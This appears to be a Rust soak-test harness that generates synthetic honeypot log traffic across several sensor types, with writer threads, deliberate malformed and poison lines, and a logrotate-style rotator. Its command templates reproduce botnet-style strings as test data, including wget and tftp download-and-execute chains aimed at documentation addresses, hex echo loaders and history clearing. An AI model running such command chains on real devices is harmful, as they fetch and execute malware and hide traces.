//! Synthetic sensor traffic: line generation, the per-sensor writer threads and the log rotator.
//!
//! Every source address is RFC 5737 (IPv4) or 2001:db8::/32 (IPv6). Every line carries
//! `metadata.soak_run` and `metadata.soak_seq` so the accounting can match each written line to a
//! ledger row (or explain its absence) without trusting the ledger's own counters.

use std::fs::OpenOptions;
use std::io::Write;
use std::net::{IpAddr, Ipv6Addr};
use std::os::unix::fs::OpenOptionsExt;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use chrono::{DateTime, SecondsFormat, Utc};
use serde_json::{Value, json};

/// Seeded xorshift64*; the harness needs a reproducible stream, not cryptographic randomness.
pub struct Rng(u64);

impl Rng {
    pub fn new(seed: u64) -> Self {
        Self(seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1)
    }

    pub fn next_u64(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x >> 12;
        x ^= x << 25;
        x ^= x >> 27;
        self.0 = x;
        x.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }

    pub fn below(&mut self, n: u64) -> u64 {
        self.next_u64() % n.max(1)
    }

    pub fn unit(&mut self) -> f64 {
        (self.next_u64() >> 11) as f64 / (1u64 << 53) as f64
    }

    fn range(&mut self, lo: usize, hi: usize) -> usize {
        lo + self.below((hi - lo + 1) as u64) as usize
    }

    fn pick<'a, T>(&mut self, items: &'a [T]) -> &'a T {
        &items[self.below(items.len() as u64) as usize]
    }
}

/// What a generated line is. Everything but `Normal` is a line the ledger is not expected to hold.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum LineKind {
    Normal,
    /// Valid event JSON of ~900 KB: accepted, the largest line the tailer keeps.
    NearMax,
    /// Not JSON: the runner counts it rejected and moves on.
    Malformed,
    /// Over `MAX_LINE_BYTES`: the tailer discards it without parsing.
    Overlength,
    /// Valid JSON the database always refuses (NUL in a jsonb string): wedges that sensor's intake.
    Poison,
}

pub struct SensorMix {
    pub signals: &'static [(&'static str, u32)],
}

pub fn mix_for(sensor: &str) -> SensorMix {
    const TELNET: &[(&str, u32)] = &[
        ("honeypot_command_exec", 45),
        ("honeypot_login_attempt", 40),
        ("honeypot_connection", 13),
        ("honeypot_session_end", 2),
    ];
    const SSH: &[(&str, u32)] = &[
        ("honeypot_login_attempt", 60),
        ("honeypot_connection", 20),
        ("honeypot_command_exec", 18),
        ("honeypot_session_end", 2),
    ];
    const HTTP: &[(&str, u32)] = &[
        ("honeypot_connection", 75),
        ("honeypot_login_attempt", 10),
        ("honeypot_command_exec", 13),
        ("honeypot_session_end", 2),
    ];
    const CRED: &[(&str, u32)] = &[("honeypot_login_attempt", 95), ("honeypot_connection", 5)];
    const ADB: &[(&str, u32)] = &[
        ("honeypot_connection", 30),
        ("honeypot_command_exec", 55),
        ("honeypot_file_download", 10),
        ("honeypot_session_end", 5),
    ];
    SensorMix {
        signals: match sensor {
            "ssh" => SSH,
            "http" => HTTP,
            "cred" => CRED,
            "adb" => ADB,
            _ => TELNET,
        },
    }
}

fn pick_signal(rng: &mut Rng, mix: &SensorMix) -> &'static str {
    let total: u32 = mix.signals.iter().map(|(_, w)| w).sum();
    let mut roll = rng.below(total as u64) as u32;
    for (signal, weight) in mix.signals {
        if roll < *weight {
            return signal;
        }
        roll -= weight;
    }
    mix.signals[0].0
}

/// Hot (a handful of bot loops carrying most of the traffic), warm (hundreds of repeat sources) and
/// cold (a long tail), the tiering the intake performance report measured. The shares are for the
/// telnet sensor; every other sensor sees fewer hot sources.
fn source_ip(rng: &mut Rng, telnet_like: bool) -> IpAddr {
    let (hot, warm) = if telnet_like {
        (0.40, 0.20)
    } else {
        (0.10, 0.40)
    };
    let u = rng.unit();
    if u < hot {
        const WEIGHTS: [u64; 5] = [50, 27, 13, 7, 3];
        let mut roll = rng.below(100);
        let mut idx = 0;
        for (i, w) in WEIGHTS.iter().enumerate() {
            if roll < *w {
                idx = i;
                break;
            }
            roll -= w;
        }
        return format!("192.0.2.{}", 1 + idx).parse().expect("literal");
    }
    if u < hot + warm {
        let idx = rng.below(500);
        let text = if idx < 250 {
            format!("198.51.100.{}", 1 + idx)
        } else {
            format!("203.0.113.{}", 1 + idx - 250)
        };
        return text.parse().expect("literal");
    }
    let k = (rng.unit().powi(3) * 300_000.0) as u32;
    IpAddr::V6(Ipv6Addr::new(
        0x2001,
        0x0db8,
        (k >> 16) as u16,
        (k & 0xffff) as u16,
        0,
        0,
        0,
        1,
    ))
}

fn uuid_like(rng: &mut Rng) -> String {
    let a = rng.next_u64();
    let b = rng.next_u64();
    format!(
        "{:08x}-{:04x}-7{:03x}-8{:03x}-{:012x}",
        (a >> 32) as u32,
        (a >> 16) as u16,
        a as u16 & 0x0fff,
        (b >> 48) as u16 & 0x0fff,
        b & 0xffff_ffff_ffff
    )
}

const SHORT_COMMANDS: &[&str] = &[
    "enable",
    "system",
    "shell",
    "sh",
    "linuxshell",
    "ping ; sh",
    "/bin/busybox ECCHI",
    "/bin/busybox ps; /bin/busybox ECCHI",
    "cat /proc/cpuinfo | grep name | wc -l",
    "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
    "ls -la /home",
    "uname -a",
    "cd /tmp; ls",
    "rm -rf /tmp/.x; mkdir -p /tmp/.x",
    "ifconfig",
    "cat /proc/mounts",
    "/bin/busybox cat /bin/echo",
    "history -c",
    "w",
    "id",
    "crontab -l",
];

const ARCHES: &[&str] = &[
    "mips", "mpsl", "arm", "arm5", "arm6", "arm7", "sh4", "x86_64", "i686",
];

fn medium_piece(rng: &mut Rng) -> String {
    let stage = format!("192.0.2.{}", 100 + rng.below(20));
    let name = format!("{:x}", rng.below(0xfff));
    match rng.below(4) {
        0 => format!(
            "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://{stage}/{name}.sh; \
             chmod 777 {name}.sh; sh {name}.sh; rm -rf {name}.sh"
        ),
        1 => format!(
            "for a in {}; do wget http://{stage}/$a -O .c; chmod +x .c && ./.c telnet.$a && break; done",
            ARCHES.join(" ")
        ),
        2 => format!(
            "tftp -g -l /tmp/{name} -r {name} {stage}; chmod +x /tmp/{name}; /tmp/{name} telnet; rm -f /tmp/{name}"
        ),
        _ => format!(
            "busybox wget http://{stage}/bins/{} -O - > /tmp/.{name}; chmod 777 /tmp/.{name}; /tmp/.{name} telnet",
            rng.pick(ARCHES)
        ),
    }
}

fn hex_echo(rng: &mut Rng, target_len: usize) -> String {
    let mut out = String::with_capacity(target_len + 32);
    out.push_str("echo -ne \"");
    while out.len() < target_len {
        out.push_str(&format!("\\x{:02x}", rng.below(256)));
    }
    out.push_str("\" >> /tmp/.");
    out.push_str(&format!("{:x}", rng.below(0xfff)));
    out
}

/// Command text of the shapes bot loops send: short probes, download-and-run chains, and echo
/// loaders that carry a binary as `\xNN` escapes (the long lines). The sizes are chosen so the
/// whole line averages about 0.9 KB, the figure the tailer benchmark used.
fn telnet_command(rng: &mut Rng) -> String {
    let roll = rng.below(100);
    if roll < 60 {
        rng.pick(SHORT_COMMANDS).to_string()
    } else if roll < 85 {
        let target = rng.range(300, 1500);
        let mut text = medium_piece(rng);
        while text.len() < target {
            text.push_str("; ");
            text.push_str(&medium_piece(rng));
        }
        text
    } else if roll < 98 {
        let n = rng.range(1500, 8000);
        hex_echo(rng, n)
    } else {
        let n = rng.range(8000, 64_000);
        hex_echo(rng, n)
    }
}

const OTHER_COMMANDS: &[&str] = &[
    "uname -a",
    "cat /proc/cpuinfo",
    "uptime",
    "pm path com.android.vending",
    "getprop ro.product.model",
    "ls /sdcard",
    "wget http://192.0.2.101/a.sh -O /tmp/a.sh; sh /tmp/a.sh",
    "id; whoami; hostname",
];

const USERNAMES: &[&str] = &[
    "root", "admin", "user", "support", "guest", "default", "ubnt", "pi", "oracle",
];

fn metadata(rng: &mut Rng, sensor: &str, signal: &str, run: &str, seq: u64) -> Value {
    let mut meta = match signal {
        "honeypot_connection" => json!({ "protocol_label": sensor }),
        "honeypot_login_attempt" => json!({
            "protocol_label": sensor,
            "username": rng.pick(USERNAMES),
        }),
        "honeypot_command_exec" => {
            let command = if sensor == "telnet" {
                telnet_command(rng)
            } else {
                rng.pick(OTHER_COMMANDS).to_string()
            };
            json!({ "protocol_label": sensor, "command": command, "shell": "busybox" })
        }
        "honeypot_file_download" => json!({
            "protocol_label": sensor,
            "url": format!("http://192.0.2.{}/{:x}.apk", 100 + rng.below(20), rng.below(0xffff)),
        }),
        _ => json!({
            "protocol_label": sensor,
            "duration_ms": rng.below(120_000),
            "commands": rng.below(40),
        }),
    };
    if sensor == "http" {
        meta["method"] = json!("GET");
        meta["path"] = json!(format!("/cgi-bin/{:x}", rng.below(0xffff)));
    }
    meta["local_port"] = json!(match sensor {
        "telnet" => 23,
        "ssh" => 22,
        "http" => 80,
        "adb" => 5555,
        _ => 8080,
    });
    meta["soak_run"] = json!(run);
    meta["soak_seq"] = json!(seq);
    meta
}

/// One line without its trailing newline.
pub fn build_line(
    rng: &mut Rng,
    sensor: &str,
    run: &str,
    seq: u64,
    kind: LineKind,
    observed_at: DateTime<Utc>,
) -> String {
    if kind == LineKind::Malformed {
        return format!("{{ \"v\": 1, \"source_ip\": soak-truncated seq={seq}");
    }
    let mix = mix_for(sensor);
    let mut signal = pick_signal(rng, &mix);
    let mut meta;
    match kind {
        LineKind::Overlength | LineKind::NearMax | LineKind::Poison => {
            signal = "honeypot_command_exec";
            meta = metadata(rng, sensor, signal, run, seq);
            let pad = match kind {
                LineKind::Overlength => 1_150_000,
                LineKind::NearMax => 900_000,
                _ => 0,
            };
            meta["command"] = if kind == LineKind::Poison {
                json!("echo \u{0}")
            } else {
                json!("A".repeat(pad))
            };
        }
        _ => meta = metadata(rng, sensor, signal, run, seq),
    }
    let telnet_like = sensor == "telnet";
    let authenticated = signal != "honeypot_connection";
    let wan = if rng.below(2) == 0 {
        "192.0.2.250"
    } else {
        "192.0.2.251"
    };
    json!({
        "v": 1,
        "source_ip": source_ip(rng, telnet_like),
        "wan_ip": wan,
        "sensor": sensor,
        "signal_type": signal,
        "protocol": "tcp",
        "authenticated": authenticated,
        "observed_at": observed_at.to_rfc3339_opts(SecondsFormat::Micros, true),
        "metadata": meta,
        "sample": Value::Null,
        "session_id": uuid_like(rng),
        "occurrence_id": uuid_like(rng),
    })
    .to_string()
}

/// A copytruncate or rename rotation: the sequence numbers that were in the live file when it
/// happened. For a copytruncate, a line of this range the intake had not read yet is lost to the
/// live stream (it sits in the rotated copy), which is the documented trade-off; a rename keeps
/// the old inode readable, so nothing may be lost.
#[derive(Clone, Debug)]
pub struct Rotation {
    pub copytruncate: bool,
    pub first_seq: u64,
    pub end_seq_exclusive: u64,
}

#[derive(Default)]
pub struct WriterLedger {
    pub malformed: Vec<u64>,
    pub overlength: Vec<u64>,
    pub nearmax: Vec<u64>,
    pub poison: Vec<u64>,
    pub rotations: Vec<Rotation>,
    pub generation_start: u64,
}

pub struct WriterShared {
    pub name: String,
    pub path: PathBuf,
    pub next_seq: AtomicU64,
    pub bytes: AtomicU64,
    /// Held while a tick writes its lines, and by the rotator while it renames or truncates, so a
    /// rotation sees a whole number of lines and a consistent `next_seq`.
    pub io: Mutex<()>,
    pub ledger: Mutex<WriterLedger>,
    pub poison_requested: AtomicBool,
    pub failed: Mutex<Option<String>>,
}

impl WriterShared {
    pub fn new(name: &str, path: PathBuf) -> Arc<Self> {
        Arc::new(Self {
            name: name.to_string(),
            path,
            next_seq: AtomicU64::new(0),
            bytes: AtomicU64::new(0),
            io: Mutex::new(()),
            ledger: Mutex::new(WriterLedger::default()),
            poison_requested: AtomicBool::new(false),
            failed: Mutex::new(None),
        })
    }
}

#[derive(Clone)]
pub struct WriterCfg {
    pub run: String,
    pub rate: f64,
    pub seed: u64,
    pub malformed_every: u64,
    pub overlength_every: u64,
    pub nearmax_every: u64,
    pub spike_every_secs: u64,
    pub spike_secs: u64,
    pub spike_x: f64,
}

fn line_kind(cfg: &WriterCfg, seq: u64, poison: bool) -> LineKind {
    let hits = |every: u64| every > 0 && (seq + 1).is_multiple_of(every);
    if poison {
        LineKind::Poison
    } else if hits(cfg.overlength_every) {
        LineKind::Overlength
    } else if hits(cfg.malformed_every) {
        LineKind::Malformed
    } else if hits(cfg.nearmax_every) {
        LineKind::NearMax
    } else {
        LineKind::Normal
    }
}

fn append_handle(path: &Path) -> std::io::Result<std::fs::File> {
    OpenOptions::new()
        .create(true)
        .append(true)
        .mode(0o644)
        .open(path)
}

fn note_kind(shared: &WriterShared, seq: u64, kind: LineKind) {
    if kind == LineKind::Normal {
        return;
    }
    let mut ledger = shared.ledger.lock().unwrap_or_else(|p| p.into_inner());
    match kind {
        LineKind::Malformed => ledger.malformed.push(seq),
        LineKind::Overlength => ledger.overlength.push(seq),
        LineKind::NearMax => ledger.nearmax.push(seq),
        LineKind::Poison => ledger.poison.push(seq),
        LineKind::Normal => {}
    }
}

/// Writes `target_bytes` of backdated lines to the log before the intake starts, standing in for
/// the backlog of a stalled intake. Backdating is proportional to bytes so the oldest line is as
/// old as `target_bytes` of traffic at the configured rate.
pub fn prefill(cfg: &WriterCfg, shared: &WriterShared, target_bytes: u64) -> std::io::Result<()> {
    if target_bytes == 0 {
        return Ok(());
    }
    let mut rng = Rng::new(cfg.seed ^ 0x5eed);
    let end = Utc::now();
    let span_secs = target_bytes as f64 / (cfg.rate.max(1.0) * 930.0);
    let mut out = std::io::BufWriter::with_capacity(1 << 20, append_handle(&shared.path)?);
    let _io = shared.io.lock().unwrap_or_else(|p| p.into_inner());
    let mut written = 0u64;
    while written < target_bytes {
        let seq = shared.next_seq.fetch_add(1, Ordering::SeqCst);
        let kind = line_kind(cfg, seq, false);
        note_kind(shared, seq, kind);
        let frac = written as f64 / target_bytes as f64;
        let observed =
            end - chrono::Duration::microseconds(((1.0 - frac) * span_secs * 1e6) as i64);
        let mut line = build_line(&mut rng, &shared.name, &cfg.run, seq, kind, observed);
        line.push('\n');
        out.write_all(line.as_bytes())?;
        written += line.len() as u64;
    }
    out.flush()?;
    shared.bytes.fetch_add(written, Ordering::Relaxed);
    Ok(())
}

pub fn run_writer(cfg: WriterCfg, shared: Arc<WriterShared>, stop: Arc<AtomicBool>) {
    let mut rng = Rng::new(cfg.seed ^ shared.name.bytes().fold(7u64, |a, b| a * 31 + b as u64));
    let tick = Duration::from_millis(20);
    let started = Instant::now();
    let mut last = Instant::now();
    let mut carry = 0.0f64;
    while !stop.load(Ordering::Relaxed) {
        std::thread::sleep(tick);
        let now = Instant::now();
        let dt = now.duration_since(last).as_secs_f64();
        last = now;
        let elapsed = started.elapsed().as_secs();
        let spiking = cfg.spike_every_secs > 0
            && cfg.spike_secs > 0
            && elapsed % cfg.spike_every_secs < cfg.spike_secs;
        carry += cfg.rate * if spiking { cfg.spike_x } else { 1.0 } * dt;
        let due = carry.floor();
        carry -= due;
        if due < 1.0 {
            continue;
        }
        let result = (|| -> std::io::Result<()> {
            let _io = shared.io.lock().unwrap_or_else(|p| p.into_inner());
            let mut file = append_handle(&shared.path)?;
            for _ in 0..due as u64 {
                let seq = shared.next_seq.fetch_add(1, Ordering::SeqCst);
                let poison = shared.poison_requested.swap(false, Ordering::SeqCst);
                let kind = line_kind(&cfg, seq, poison);
                note_kind(&shared, seq, kind);
                let mut line = build_line(&mut rng, &shared.name, &cfg.run, seq, kind, Utc::now());
                line.push('\n');
                file.write_all(line.as_bytes())?;
                shared.bytes.fetch_add(line.len() as u64, Ordering::Relaxed);
            }
            Ok(())
        })();
        if let Err(e) = result {
            *shared.failed.lock().unwrap_or_else(|p| p.into_inner()) = Some(e.to_string());
            return;
        }
    }
}

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum RotationMode {
    Copytruncate,
    Rename,
    Alternate,
}

#[derive(Clone)]
pub struct RotateCfg {
    pub every: Duration,
    pub min_bytes: u64,
    pub mode: RotationMode,
    pub keep: usize,
}

fn generation(path: &Path, n: usize) -> PathBuf {
    let mut name = path.as_os_str().to_os_string();
    name.push(format!(".{n}"));
    PathBuf::from(name)
}

fn shift_generations(path: &Path, keep: usize) {
    let _ = std::fs::remove_file(generation(path, keep));
    for n in (1..keep).rev() {
        let _ = std::fs::rename(generation(path, n), generation(path, n + 1));
    }
}

fn rotate_one(shared: &WriterShared, cfg: &RotateCfg, copytruncate: bool) -> std::io::Result<()> {
    shift_generations(&shared.path, cfg.keep);
    let first_seq = shared
        .ledger
        .lock()
        .unwrap_or_else(|p| p.into_inner())
        .generation_start;
    let end_seq = if copytruncate {
        std::fs::copy(&shared.path, generation(&shared.path, 1))?;
        let _io = shared.io.lock().unwrap_or_else(|p| p.into_inner());
        OpenOptions::new()
            .write(true)
            .open(&shared.path)?
            .set_len(0)?;
        shared.next_seq.load(Ordering::SeqCst)
    } else {
        let _io = shared.io.lock().unwrap_or_else(|p| p.into_inner());
        std::fs::rename(&shared.path, generation(&shared.path, 1))?;
        shared.next_seq.load(Ordering::SeqCst)
    };
    let mut ledger = shared.ledger.lock().unwrap_or_else(|p| p.into_inner());
    ledger.rotations.push(Rotation {
        copytruncate,
        first_seq,
        end_seq_exclusive: end_seq,
    });
    ledger.generation_start = end_seq;
    Ok(())
}

/// logrotate's `size`-gated hourly pass over every log: rotate a log only once it is at least
/// `min_bytes`.
pub fn run_rotator(cfg: RotateCfg, logs: Vec<Arc<WriterShared>>, stop: Arc<AtomicBool>) {
    let mut count = 0usize;
    let mut next = Instant::now() + cfg.every;
    while !stop.load(Ordering::Relaxed) {
        std::thread::sleep(Duration::from_millis(200));
        if Instant::now() < next {
            continue;
        }
        next = Instant::now() + cfg.every;
        for shared in &logs {
            let size = std::fs::metadata(&shared.path)
                .map(|m| m.len())
                .unwrap_or(0);
            if size < cfg.min_bytes {
                continue;
            }
            let copytruncate = match cfg.mode {
                RotationMode::Copytruncate => true,
                RotationMode::Rename => false,
                RotationMode::Alternate => count.is_multiple_of(2),
            };
            if let Err(e) = rotate_one(shared, &cfg, copytruncate) {
                *shared.failed.lock().unwrap_or_else(|p| p.into_inner()) =
                    Some(format!("rotation failed: {e}"));
                return;
            }
        }
        count += 1;
    }
}
